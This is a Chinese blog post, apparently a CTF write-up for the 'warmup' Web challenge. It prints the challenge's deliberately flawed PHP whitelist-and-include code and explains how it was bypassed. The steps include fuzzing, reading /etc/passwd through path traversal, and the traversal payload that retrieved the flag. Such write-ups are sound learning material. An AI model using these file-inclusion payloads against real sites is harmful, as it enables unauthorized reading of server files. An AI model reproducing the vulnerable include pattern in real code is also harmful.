---
layout: post
title: Web进阶题-warmup
excerpt: "攻防世界进阶Web题目-warmup"
date:   2020-10-15 22:09:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网站，网站页面只有一个大大的"滑稽"，同时网页源码中有一行注释"source.php"

2. 访问"source.php"，网页返回内容如下

   ```php
   <?php
       highlight_file(__FILE__);
       class emmm
       {
           public static function checkFile(&$page)
           {
               $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
               if (! isset($page) || !is_string($page)) {
                   echo "you can't see it";
                   return false;
               }
   
               if (in_array($page, $whitelist)) {
                   return true;
               }
   
               $_page = mb_substr(
                   $page,
                   0,
                   mb_strpos($page . '?', '?')
               );
               if (in_array($_page, $whitelist)) {
                   return true;
               }
   
               $_page = urldecode($page);
               $_page = mb_substr(
                   $_page,
                   0,
                   mb_strpos($_page . '?', '?')
               );
               if (in_array($_page, $whitelist)) {
                   return true;
               }
               echo "you can't see it";
               return false;
           }
       }
   
       if (! empty($_REQUEST['file'])&& is_string($_REQUEST['file'])&& emmm::checkFile($_REQUEST['file'])) {
           include $_REQUEST['file'];
           exit;
       } else {
           echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
       }  
   ?>
   ```

   * 以PHP语法高亮当前文档，由于后面有include函数，所以本题应该是通过*highlight_file()*把flag打印出来
   * 声明了一个emmm的类，类中有一个静态方法checkFile
     * $page未被指定或page不是字符串时，失败
     * 当$page在白名单内，成功
     * 通过mb_substr()将$page提取从头开始到第一个？的字符子串为$_page，三个参数分别为str、start、length，字符串索引号从0开始，当$page在白名单内，成功
     * 先url解码，再通过mb_substr()将$page提取从头开始到第一个？的字符子串为$_page，三个参数分别为str、start、length，字符串索引号从0开始，当$page在白名单内，成功
   * 网页当file被设置、file是字符串、checkFile通过的时候，会加载file中的内容到source.php中当作代码

3. 发现source.php中的白名单有提到hint.php

   * 访问hint.php

     ```html
        flag not here, and flag in ffffllllaaaagggg
     ```

   * 访问source.php?file=hint.php，返回内容仍不变

   * 所以本题最终访问的文件应该在ffffllllaaaagggg，而不在hint.php中

4. 通过检索发现in_array()在不设置第三个参数时，是不强制对数据类型检测的

5. 因为最后读取的file参数，我们只需checkFile()返回true，所以我们需要使其中一个in_array()返回真

6. checkFile方法进行判断时会对*？*进行截断，也就是说？后边的内容会被特殊处理

   * 我们include的参数可能是网址加上get参数，这样可以正常返回，然后include，尝试失败。因为如果include参数带上get参数的话，前面必须有域名和端口，而本题起始几个字符必须是source.php、hint.php，所以这种可能是没有的

   * 使用Burp Suite的Intruder模块，对*/source.php?file=source.php?$x$*，采用Fuzz Payload进行测试，发现Payload为*../../../../../../../../../../etc/passwd*时，网页返回了passwd的文件内容，所以可能*?*后面被单独作为了文件名处理
   * 访问*/source.php?file=source.php?./source.php*，返回为空
   * 访问*/source.php?file=source.php?../source.php*，返回内容为空，由于Burp Suite的Payload有很多../，进一步加../
   * 访问*/source.php?file=source.php?../../source.php*，顺利读取到source.php的内容
   * 访问*/source.php?file=source.php?../../ffffllllaaaagggg*，返回内容为空
   * 访问*/source.php?file=source.php?../../ffffllllaaaagggg*，返回内容为空
   * 继续加../，直到
   * 访问*/source.php?file=source.php?../../../../../ffffllllaaaagggg*，返回内容为"flag{25e7bce6005c4e0c983fb97297ac6e5a}"

7. 提交，答案正确

## 独立思考

### 1. 为什么include把*?*后面的内容当作相对路径？

不对，其实是include把/后面的内容当作了路径。


## 产生过的疑问

1. 为什么include把*?*后面的内容当作相对路径？

